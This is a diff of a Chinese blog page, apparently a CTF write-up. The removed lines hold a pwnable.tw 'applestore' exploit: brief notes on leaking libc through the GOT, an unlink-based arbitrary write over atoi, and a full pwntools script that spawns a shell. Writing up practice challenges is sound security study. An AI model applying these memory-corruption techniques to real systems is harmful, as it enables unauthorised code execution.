-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	add(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	add(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">checkout()</span><br></pre></td></tr></table></figure>
-<p>  接下来，进到cart()函数中，利用myread来覆盖ebp-0x20(iphone8.itemName)处为puts的got表地址，以此泄露libc地址，通过链表遍历的办法来获得栈上节点地址:</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leakAddr</span>(<span class="params">data</span>):</span><br><span class="line">	cart(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;27: &#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line">items_start_at = <span class="number">0x804B070</span></span><br><span class="line">libc_base = leakAddr(p32(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0</span>)*<span class="number">3</span>) - l.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">heap_base = leakAddr(p32(items_start_at) + p32(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">temp_addr = heap_base</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">	temp_addr = leakAddr(p32(temp_addr + <span class="number">8</span>) + p32(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">delet_ebp = temp_addr + <span class="number">0x20</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>  delete函数中同样能修改栈上节点的内容，通过delete函数完成unlink实现任意地址写:</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;27&#x27;</span></span><br><span class="line">payload1 += p32(<span class="number">0</span>)*<span class="number">2</span> + p32(delet_ebp - <span class="number">0x0c</span>) + p32(e.got[<span class="string">&#x27;atoi&#x27;</span>] + <span class="number">0x22</span>)</span><br><span class="line">delete(payload1)</span><br></pre></td></tr></table></figure>
-<p>  接下来handler函数会调用myread读入nptr，只需传入system及其参数就可以完成getshell了:</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload2 = p32(libc_base + l.symbols[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&quot;;sh\x00&quot;</span></span><br><span class="line">p.sendline(payload2)</span><br></pre></td></tr></table></figure>
-
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>  完整代码:</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10104</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./applestore&quot;</span>)</span><br><span class="line">l = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">data</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Device Number&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkout</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Let me check your cart. ok? (y/n) &gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;y\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cart</span>(<span class="params">data</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Let me check your cart. ok? (y/n) &gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;y\x00&#x27;</span> + data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">data</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Item Number&gt;&#x27;</span>)</span><br><span class="line">	p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leakAddr</span>(<span class="params">data</span>):</span><br><span class="line">	cart(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;27: &#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line">items_start_at = <span class="number">0x804B070</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	add(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	add(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">checkout()</span><br><span class="line"></span><br><span class="line">libc_base = leakAddr(p32(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0</span>)*<span class="number">3</span>) - l.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">heap_base = leakAddr(p32(items_start_at) + p32(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">temp_addr = heap_base</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">	temp_addr = leakAddr(p32(temp_addr + <span class="number">8</span>) + p32(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">delet_ebp = temp_addr + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;27&#x27;</span></span><br><span class="line">payload1 += p32(<span class="number">0</span>)*<span class="number">2</span> + p32(delet_ebp - <span class="number">0x0c</span>) + p32(e.got[<span class="string">&#x27;atoi&#x27;</span>] + <span class="number">0x22</span>)</span><br><span class="line">delete(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload2 = p32(libc_base + l.symbols[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&quot;;sh\x00&quot;</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -814,7 +805,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -827,7 +818,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">23</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -872,13 +863,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">58k</span>
+    <span title="站点总字数">66k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">53 分钟</span>
+    <span title="站点阅读时长">1:01</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Muse</a> 强力驱动
   </div>
